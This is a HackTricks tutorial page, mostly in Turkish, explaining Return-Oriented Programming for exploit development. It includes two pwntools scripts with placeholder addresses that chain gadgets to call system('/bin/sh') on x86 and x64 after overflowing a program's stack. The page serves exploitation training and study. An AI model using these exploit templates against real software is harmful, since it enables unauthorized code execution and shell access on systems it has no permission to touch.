# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi güvenlik önlemlerini aşmak için kullanılan ileri düzey bir istismar tekniğidir. Bir saldırgan, shellcode enjekte etmek ve çalıştırmak yerine, ikili dosyada veya yüklenmiş kütüphanelerde zaten mevcut olan kod parçalarını, yani **"gadgets"** kullanır. Her gadget genellikle bir `ret` talimatı ile biter ve veri taşımak veya aritmetik işlemler yapmak gibi küçük bir işlem gerçekleştirir. Bu gadget'ları bir araya getirerek, bir saldırgan, NX/DEP korumalarını etkili bir şekilde aşarak keyfi işlemler gerçekleştiren bir yük oluşturabilir.

### ROP Nasıl Çalışır

1. **Kontrol Akışını Ele Geçirme**: İlk olarak, bir saldırgan, genellikle bir tampon taşması istismarı ile yığın üzerindeki kaydedilmiş dönüş adresini geçersiz kılmak suretiyle bir programın kontrol akışını ele geçirmelidir.
2. **Gadget Zincirleme**: Saldırgan daha sonra istenen eylemleri gerçekleştirmek için gadget'ları dikkatlice seçer ve zincirler. Bu, bir fonksiyon çağrısı için argümanları ayarlamayı, fonksiyonu çağırmayı (örneğin, `system("/bin/sh")`) ve gerekli temizlik veya ek işlemleri yönetmeyi içerebilir.
3. **Yükün Çalıştırılması**: Zayıf fonksiyon döndüğünde, meşru bir konuma dönmek yerine, gadget zincirini çalıştırmaya başlar.

### Araçlar

Genellikle, gadget'lar **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** veya doğrudan **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) kullanılarak bulunabilir.

## x86 Örneğinde ROP Zinciri

### **x86 (32-bit) Çağrı Konvansiyonları**

* **cdecl**: Çağrıyı yapan yığını temizler. Fonksiyon argümanları yığına ters sırayla (sağdan sola) itilir. **Argümanlar yığına sağdan sola itilir.**
* **stdcall**: cdecl'e benzer, ancak çağrılan fonksiyon yığını temizlemekten sorumludur.

### **Gadget Bulma**

Öncelikle, ikili dosya veya yüklenmiş kütüphaneler içinde gerekli gadget'ları tanımladığımızı varsayalım. İlgilendiğimiz gadget'lar şunlardır:

* `pop eax; ret`: Bu gadget, yığının en üstündeki değeri `EAX` kaydedicisine alır ve ardından döner, böylece `EAX`'i kontrol etmemizi sağlar.
* `pop ebx; ret`: Yukarıdaki gibi, ancak `EBX` kaydedicisi için, `EBX` üzerinde kontrol sağlar.
* `mov [ebx], eax; ret`: `EAX`'deki değeri `EBX` tarafından işaret edilen bellek konumuna taşır ve ardından döner. Bu genellikle **write-what-where gadget** olarak adlandırılır.
* Ayrıca, `system()` fonksiyonunun adresine de sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, `system('/bin/sh')`'yi çalıştırmayı hedefleyerek ROP zinciri yürütmesi için yığını aşağıdaki gibi hazırlarız, zincirin nasıl başladığına dikkat edin:

1. Hizalama amaçlı bir `ret` talimatı (isteğe bağlı)
2. `system` fonksiyonunun adresi (ASLR'nin devre dışı bırakıldığını ve libc'nin bilindiğini varsayarak, daha fazla bilgi için [**Ret2lib**](ret2lib/))
3. `system()`'den dönüş adresi için yer tutucu
4. `"/bin/sh"` dizesinin adresi (system fonksiyonu için parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Zinciri x64 Örneği

### **x64 (64-bit) Çağrı Konvansiyonları**

* **Unix benzeri sistemlerde** **System V AMD64 ABI** çağrı konvansiyonu kullanılır; burada **ilk altı tamsayı veya işaretçi argümanı `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9`** kayıtlarında iletilir. Ek argümanlar yığında iletilir. Dönüş değeri `RAX`'a yerleştirilir.
* **Windows x64** çağrı konvansiyonu, ilk dört tamsayı veya işaretçi argümanı için `RCX`, `RDX`, `R8` ve `R9` kullanır; ek argümanlar yığında iletilir. Dönüş değeri `RAX`'a yerleştirilir.
* **Kayıtlar**: 64-bit kayıtlar `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8`'den `R15`'e kadar içerir.

#### **Gadget Bulma**

Amacımız için, **RDI** kaydını ayarlamamıza ( **"/bin/sh"** dizesini **system()** fonksiyonuna argüman olarak iletmek için) ve ardından **system()** fonksiyonunu çağırmamıza olanak tanıyacak gadget'lara odaklanalım. Aşağıdaki gadget'ları belirlediğimizi varsayıyoruz:

* **pop rdi; ret**: Yığının en üstündeki değeri **RDI**'ye alır ve ardından döner. **system()** için argümanımızı ayarlamak için gereklidir.
* **ret**: Basit bir dönüş, bazı senaryolarda yığın hizalaması için faydalıdır.

Ve **system()** fonksiyonunun adresini bildiğimizi biliyoruz.

### **ROP Zinciri**

Aşağıda, **pwntools** kullanarak **x64** üzerinde **system('/bin/sh')** çalıştırmayı hedefleyen bir ROP zinciri kurma ve yürütme örneği bulunmaktadır:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* **`RDI`**'yi **`"/bin/sh"`** adresine ayarlamak için **`pop rdi; ret`** gadget'ını kullanıyoruz.
* **`RDI`**'yi ayarladıktan sonra, zincirde **system()**'ın adresi ile doğrudan **`system()`**'e atlıyoruz.
* Hedef ortamın gerektirmesi durumunda hizalama için **`ret_gadget`** kullanılır; bu, işlevleri çağırmadan önce doğru yığın hizalamasını sağlamak için **x64**'te daha yaygındır.

### Yığın Hizalaması

**x86-64 ABI** bir **call instruction** yürütüldüğünde **yığının 16-byte hizalı** olmasını garanti eder. **LIBC**, performansı optimize etmek için **SSE instructions** (örneğin **movaps**) kullanır ve bu hizalamayı gerektirir. Yığın düzgün hizalanmamışsa (yani **RSP** 16'nın katı değilse), **ROP chain** içinde **system** gibi işlevlere yapılan çağrılar başarısız olur. Bunu düzeltmek için, **system**'i çağırmadan önce ROP zincirinizde basitçe bir **ret gadget** ekleyin.

## x86 vs x64 ana fark

{% hint style="success" %}
x64, ilk birkaç argüman için register'lar kullandığından, genellikle basit işlev çağrıları için x86'dan daha az gadget gerektirir, ancak doğru gadget'ları bulmak ve zincirlemek, register sayısının artması ve daha büyük adres alanı nedeniyle daha karmaşık olabilir. **x64** mimarisindeki artan register sayısı ve daha büyük adres alanı, özellikle Return-Oriented Programming (ROP) bağlamında exploit geliştirme için hem fırsatlar hem de zorluklar sunar.
{% endhint %}

## Koruma Önlemleri

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Diğer Örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP tabanlı teknikler

ROP'un, keyfi kodu yürütmek için sadece bir teknik olduğunu unutmayın. ROP'a dayalı olarak birçok Ret2XXX tekniği geliştirilmiştir:

* **Ret2lib**: Keyfi parametrelerle yüklü bir kütüphaneden keyfi işlevleri çağırmak için ROP kullanın (genellikle `system('/bin/sh')` gibi bir şey).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP kullanarak bir syscall'a, örneğin `execve`, çağrı hazırlayın ve keyfi komutları yürütün.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: İlki akışı kontrol etmek için EIP yerine EBP'yi kötüye kullanacak ve ikincisi Ret2lib'e benzer, ancak bu durumda akış esas olarak EBP adresleri ile kontrol edilir (EIP'yi kontrol etmek de gereklidir).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
